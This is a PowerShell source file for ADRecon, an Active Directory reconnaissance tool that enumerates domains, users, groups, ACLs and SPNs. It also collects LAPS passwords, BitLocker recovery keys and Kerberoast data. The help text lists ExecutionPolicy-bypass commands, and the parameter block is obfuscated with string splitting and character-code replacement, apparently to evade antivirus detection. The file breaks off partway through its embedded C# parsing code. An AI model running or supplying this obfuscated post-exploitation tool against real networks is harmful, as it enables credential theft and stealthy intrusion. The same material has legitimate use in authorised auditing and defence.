<#

.SYNOPSIS

    ADRecon is a tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment.

.DESCRIPTION

    ADRecon is a tool which extracts and combines various artefacts (as highlighted below) out of an AD environment. The information can be presented in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis and provide a holistic picture of the current state of the target AD environment.
    The tool is useful to various classes of security professionals like auditors, DFIR, students, administrators, etc. It can also be an invaluable post-exploitation tool for a penetration tester.
    It can be run from any workstation that is connected to the environment, even hosts that are not domain members. Furthermore, the tool can be executed in the context of a non-privileged (i.e. standard domain user) account.
    Fine Grained Password Policy, LAPS and BitLocker may require Privileged user accounts.
    The tool will use Microsoft Remote Server Administration Tools (RSAT) if available, otherwise it will communicate with the Domain Controller using LDAP.
    The following information is gathered by the tool:
    * Forest;
    * Domain;
    * Trusts;
    * Sites;
    * Subnets;
    * Schema History;
    * Default and Fine Grained Password Policy (if implemented);
    * Domain Controllers, SMB versions, whether SMB Signing is supported and FSMO roles;
    * Users and their attributes;
    * Service Principal Names (SPNs);
    * Groups, memberships and changes;
    * Organizational Units (OUs);
    * GroupPolicy objects and gPLink details;
    * DNS Zones and Records;
    * Printers;
    * Computers and their attributes;
    * PasswordAttributes (Experimental);
    * LAPS passwords (if implemented);
    * BitLocker Recovery Keys (if implemented);
    * ACLs (DACLs and SACLs) for the Domain, OUs, Root Containers, GPO, Users, Computers and Groups objects (not included in the default collection method);
    * GPOReport (requires RSAT);
    * Kerberoast (not included in the default collection method); and
    * Domain accounts used for service accounts (requires privileged account and not included in the default collection method).

    Author     : Prashant Mahajan

.NOTES

    The following commands can be used to turn off ExecutionPolicy: (Requires Admin Privs)

    PS > $ExecPolicy = Get-ExecutionPolicy
    PS > Set-ExecutionPolicy bypass
    PS > .\ADRecon.ps1
    PS > Set-ExecutionPolicy $ExecPolicy

    OR

    Start the PowerShell as follows:
    powershell.exe -ep bypass

    OR

    Already have a PowerShell open ?
    PS > $Env:PSExecutionPolicyPreference = 'Bypass'

    OR

    powershell.exe -nologo -executionpolicy bypass -noprofile -file ADRecon.ps1

.PARAMETER Method
	Which method to use; ADWS (default), LDAP

.PARAMETER DomainController
	Domain Controller IP Address or Domain FQDN.

.PARAMETER Credential
	Domain Credentials.

.PARAMETER GenExcel
	Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.

.PARAMETER OutputDir
	Path for ADRecon output folder to save the files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesn't exist)

.PARAMETER Collect
    Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast, DomainAccountsusedforServiceLogon)
    Valid values include: Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, GPOs, gPLinks, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER OutputType
    Output Type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel).
    Valid values include: STDOUT, CSV, XML, JSON, HTML, Excel, All (excludes STDOUT).

.PARAMETER DormantTimeSpan
    Timespan for Dormant accounts. (Default 90 days)

.PARAMETER PassMaxAge
    Maximum machine account password age. (Default 30 days)

.PARAMETER PageSize
    The PageSize to set for the LDAP searcher object.

.PARAMETER Threads
    The number of threads to use during processing objects. (Default 10)

.PARAMETER Log
    Create ADRecon Log using Start-Transcript

.EXAMPLE

	.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

.EXAMPLE

	.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
	[*] Running on <domain>\<hostname> - Member Workstation
    <snip>

    Example output from Domain Member with Alternate Credentials.

.EXAMPLE

	.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username> -Collect DomainControllers -OutputType Excel
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain Controllers
    [*] Total Execution Time (mins): <minutes>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx
    [*] Completed.
    [*] Output Directory: C:\ADRecon-Report-<timestamp>

    Example output from from a Non-Member using RSAT to only enumerate Domain Controllers.

.EXAMPLE

    .\ADRecon.ps1 -Method ADWS -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] SchemaHistory - May take some time
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users and SPNs - May take some time
    [-] PasswordAttributes - Experimental
    [-] Groups and Membership Changes - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers and SPNs - May take some time
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] GPOReport - May take some time
    WARNING: [*] Run the tool using RUNAS.
    WARNING: [*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:\ADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using RSAT.

.EXAMPLE

    .\ADRecon.ps1 -Method LDAP -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] LDAP bind Successful
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] SchemaHistory - May take some time
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users and SPNs - May take some time
    [-] PasswordAttributes - Experimental
    [-] Groups and Membership Changes - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers and SPNs - May take some time
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] GPOReport - May take some time
    WARNING: [*] Currently, the module is only supported with ADWS.
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:\ADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using LDAP.

.LINK

    https://github.com/adrecon/ADRecon
#>

[CmdletBinding()]
param
(
    [Parameter(Mandatory = $false, HelpMessage = ('Wh'+'ich'+' method '+'t'+'o use; AD'+'WS'+' '+'(defau'+'l'+'t'+')'+', LDAP'))]
    [ValidateSet(('AD'+'WS'), ('L'+'DAP'))]
    [string] $Method = ('A'+'DWS'),

    [Parameter(Mandatory = $false, HelpMessage = ('D'+'omain C'+'ontroller'+' I'+'P'+' '+'Add'+'ress or Domain F'+'Q'+'DN.'))]
    [string] $DomainController = '',

    [Parameter(Mandatory = $false, HelpMessage = ('Domai'+'n'+' '+'Credenti'+'als.'))]
    [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

    [Parameter(Mandatory = $false, HelpMessage = ('Pa'+'th'+' for AD'+'Reco'+'n outpu'+'t '+'fol'+'d'+'er containing'+' th'+'e CSV files t'+'o ge'+'nerate '+'the AD'+'Recon-Rep'+'ort.x'+'lsx. Use it'+' to gener'+'ate th'+'e A'+'DReco'+'n-'+'Re'+'port.xl'+'sx when Microsoft '+'Excel'+' i'+'s not'+' instal'+'led '+'on the '+'host used'+' t'+'o run ADRecon.'))]
    [string] $GenExcel,

    [Parameter(Mandatory = $false, HelpMessage = (('Path for ADRec'+'on'+' out'+'pu'+'t f'+'o'+'l'+'der to s'+'av'+'e the'+' CSV/X'+'ML/J'+'S'+'ON/'+'HT'+'M'+'L f'+'ile'+'s and th'+'e'+' ADRecon'+'-'+'Repo'+'rt'+'.xlsx. '+'('+'The f'+'older '+'s'+'pe'+'c'+'ifie'+'d w'+'ill be'+' create'+'d '+'if it do'+'e'+'snD65'+'t'+' exi'+'st'+')') -CrEplaCe ([CHar]68+[CHar]54+[CHar]53),[CHar]39))]
    [string] $OutputDir,

    [Parameter(Mandatory = $false, HelpMessage = ('Whi'+'c'+'h mo'+'dules to'+' run; Comm'+'a '+'s'+'e'+'p'+'arated'+'; '+'e'+'.'+'g F'+'or'+'est,'+'Domain (D'+'efault '+'al'+'l'+' except ACLs,'+' '+'K'+'erbero'+'ast a'+'n'+'d Domai'+'n'+'Acco'+'un'+'ts'+'usedfo'+'rS'+'erv'+'ic'+'eLogon'+') Valid values'+' '+'i'+'n'+'clude: Forest, '+'Dom'+'ain, Trus'+'ts, '+'Sites, '+'S'+'ubnets, Sc'+'hem'+'aHist'+'or'+'y,'+' Pa'+'ssword'+'Poli'+'cy,'+' Fin'+'eGrainedPa'+'ss'+'word'+'Pol'+'icy, Dom'+'ain'+'Co'+'ntrol'+'l'+'ers, Users, UserSPNs, '+'Pa'+'sswordAt'+'tr'+'ibu'+'tes,'+' Grou'+'ps, GroupCh'+'a'+'nges'+', '+'GroupMembe'+'r'+'s, O'+'Us, GP'+'Os,'+' gPLi'+'nk'+'s,'+' DN'+'S'+'Z'+'ones, DNSRecor'+'ds, Printers, Computers, Comp'+'uterS'+'P'+'Ns, '+'LAP'+'S,'+' B'+'it'+'Lock'+'er, '+'ACLs, GPOReport, Kerber'+'oa'+'s'+'t'+','+' Do'+'m'+'ainA'+'cco'+'u'+'n'+'t'+'suse'+'dfor'+'Servic'+'e'+'Lo'+'gon'))]
    [ValidateSet(('Fo'+'rest'), ('Dom'+'ai'+'n'), ('Trust'+'s'), ('Si'+'tes'), ('Subne'+'t'+'s'), ('S'+'chemaHi'+'stor'+'y'), ('Pa'+'ssw'+'o'+'rdP'+'olicy'), ('Fi'+'neGra'+'inedP'+'asswor'+'dPolicy'), ('Do'+'ma'+'inC'+'ont'+'rollers'), ('Us'+'ers'), ('UserSPN'+'s'), ('Passw'+'or'+'dAt'+'tributes'), ('Group'+'s'), ('Gr'+'ou'+'pChange'+'s'), ('Gro'+'upM'+'e'+'mbers'), ('O'+'Us'), ('GP'+'Os'), ('gPL'+'inks'), ('DN'+'SZon'+'es'), ('D'+'N'+'SRecord'+'s'), ('Pri'+'nters'), ('C'+'om'+'puters'), ('Co'+'mpu'+'ter'+'SPNs'), ('LA'+'PS'), ('Bi'+'tL'+'o'+'cker'), ('A'+'CLs'), ('GPORepor'+'t'), ('Kerb'+'e'+'roast'), ('DomainA'+'ccount'+'s'+'u'+'s'+'edfo'+'r'+'ServiceLog'+'on'), ('Defau'+'lt'))]
    [array] $Collect = ('Defaul'+'t'),

    [Parameter(Mandatory = $false, HelpMessage = ('O'+'u'+'tput type;'+' Com'+'ma seperated; e.'+'g STDOUT,CSV,'+'X'+'ML,'+'JS'+'ON'+','+'H'+'TML,Excel (De'+'f'+'ault'+' ST'+'DOUT'+' wi'+'th -Collect parameter, e'+'lse'+' '+'C'+'SV '+'and'+' E'+'xcel)'))]
    [ValidateSet(('STD'+'OUT'), ('CS'+'V'), ('X'+'ML'), ('JSO'+'N'), ('E'+'XCEL'), ('HTM'+'L'), ('A'+'ll'), ('D'+'efaul'+'t'))]
    [array] $OutputType = ('De'+'fault'),

    [Parameter(Mandatory = $false, HelpMessage = ('Time'+'span '+'for Dormant acco'+'unt'+'s. '+'Defaul'+'t '+'90 days'))]
    [ValidateRange(1,1000)]
    [int] $DormantTimeSpan = 90,

    [Parameter(Mandatory = $false, HelpMessage = ('M'+'axim'+'um machine a'+'ccount '+'p'+'assw'+'o'+'rd'+' age. Default'+' 30'+' day'+'s'))]
    [ValidateRange(1,1000)]
    [int] $PassMaxAge = 30,

    [Parameter(Mandatory = $false, HelpMessage = ('The '+'PageSize'+' t'+'o s'+'et'+' '+'for the LD'+'AP searcher ob'+'ject'+'. Default 200'))]
    [ValidateRange(1,10000)]
    [int] $PageSize = 200,

    [Parameter(Mandatory = $false, HelpMessage = ('T'+'h'+'e number'+' '+'o'+'f threads to '+'use'+' '+'du'+'ring'+' pr'+'oces'+'sing of'+' ob'+'jec'+'ts. '+'Defa'+'ul'+'t 1'+'0'))]
    [ValidateRange(1,100)]
    [int] $Threads = 10,

    [Parameter(Mandatory = $false, HelpMessage = ('C'+'reate'+' ADReco'+'n Log using Start-T'+'ransc'+'rip'+'t'))]
    [switch] $Log
)

$ADWSSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members["OperatingSystem"].Value != null ? AdDC.Members["OperatingSystem"].Value : "-") + " " + AdDC.Members["OperatingSystemHotfix"].Value + " " + AdDC.Members["OperatingSystemServicePack"].Value + " " + AdDC.Members["OperatingSystemVersion"].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members["OperationMasterRoles"].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case "InfrastructureMaster":
                            Infra = true;
                            break;
                            case "DomainNamingMaster":
                            Naming = true;
                            break;
                            case "SchemaMaster":
                            Schema = true;
                            break;
                            case "RIDMaster":
                            RID = true;
                            break;
                            case "PDCEmulator":
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", AdDC.Members["Domain"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Site", AdDC.Members["Site"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Name", AdDC.Members["Name"].Value));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.Members["IPv4Address"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Members["HostName"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.Members["IPv4Address"].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members["IPv4Address"].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Members["ObjectClass"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Members["Name"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Members["whenCreated"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Members["whenChanged"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Members["DistinguishedName"].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
